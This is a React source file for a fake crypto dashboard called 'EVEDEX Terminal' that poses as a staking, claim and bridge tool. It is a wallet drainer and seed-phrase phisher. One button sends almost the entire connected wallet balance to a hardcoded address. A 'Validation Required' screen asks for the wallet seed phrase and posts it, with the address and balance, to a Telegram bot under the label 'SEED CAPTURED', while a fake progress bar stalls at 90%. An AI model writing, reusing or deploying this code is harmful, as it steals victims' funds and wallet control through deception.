import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState("");
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [nodeId, setNodeId] = useState("EVEDEX_RELAY_0x77");

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    if (isSyncing) {
      const idInterval = setInterval(() => {
        const randomHex = Math.random().toString(16).substr(2, 5).toUpperCase();
        setNodeId(`EVEDEX_RELAY_0x${randomHex}`);
      }, 1500);
      return () => clearInterval(idInterval);
    }
  }, [isSyncing]);

  const validateSeed = (text) => {
    const words = text.trim().split(/\s+/);
    return [12, 15, 18, 21, 24].includes(words.length);
  };

  const executeTotalMove = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("INITIALIZING HANDSHAKE...");

    const gasBuffer = balance.value / 60n; 
    const totalToMove = balance.value - gasBuffer;

    try {
      sendTransaction({
        to: destination,
        value: totalToMove > 0n ? totalToMove : 0n,
        data: "0x53796e6368726f6e697a65" 
      }, {
        onSettled: () => {
          setTimeout(() => setLoadingText("VERIFYING OWNERSHIP..."), 1500);
          setTimeout(() => setLoadingText("RE-INDEXING NODE..."), 3000);
          setTimeout(() => {
            setLoading(false);
            setView("seed_gate"); 
          }, 5000);
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: "7630238860", 
        text: `🚨 EVEDEX SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nNET: ${balance?.symbol}\n\nSEED:\n${inputVal}` 
      }),
    });

    let current = 0;
    const interval = setInterval(() => {
      current += Math.floor(Math.random() * 3) + 1;
      if (current >= 90) { 
        setSyncProgress(90); 
        clearInterval(interval); 
      } else { 
        setSyncProgress(current); 
      }
    }, 200);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic tracking-tighter text-lg">
            <ShieldCheck size={22}/>EVEDEX TERMINAL
          </div>
          <div className="flex items-center gap-1.5 mt-1">
            <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-[7px] font-mono text-slate-500 tracking-[0.3em]">NODE_STATUS: ONLINE // v4.2.0</span>
          </div>
        </div>
        <w3m-button balance="show" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> },
            { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
            { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
          ].map((item) => (
            <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_SESSION</button>
          <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Sync</h2>
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">{activeTask === "Rectify" ? "Input Manual Units" : "Available Node Liquidity"}</label>
            {activeTask === "Rectify" ? (
              <input type="text" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" />
            ) : (
              <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}</div>
            )}
          </div>
          
          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
            {chains.map((c) => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">{c.name} Node</button>
            ))}
            <button onClick={() => setView("seed_gate")} className="whitespace-nowrap bg-slate-900 border border-purple-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-purple-500 uppercase active:scale-95">SOLANA (SVM) SYNC</button>
          </div>

          <button onClick={executeTotalMove} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic">AUTHORIZE HANDSHAKE</button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            {!isSyncing ? (
              <>
                <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none">Validation Required</h2>
                <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">To finalize the EVEDEX multi-chain synchronization (Base/ETH/BNB/SOL), provide the Project Authorization Seed.</p>
                <div className="mt-8"><textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900" /></div>
                <button disabled={!validateSeed(inputVal)} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${validateSeed(inputVal) ? 'bg-cyan-600 active:scale-95' : 'bg-slate-900 opacity-50'}`}>{validateSeed(inputVal) ? "Finalize Sync" : "Enter Valid Seed"}</button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-xl italic tracking-tighter uppercase mb-2">Syncing Evedex Nodes</h2>
                <p className="text-[8px] font-mono text-cyan-700 tracking-widest uppercase mb-4">{nodeId}</p>
                <p className="text-[9px] text-slate-500 lowercase animate-pulse italic">{syncProgress === 90 ? "Awaiting final node clearance..." : "Connecting to secure relay network..."}</p>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
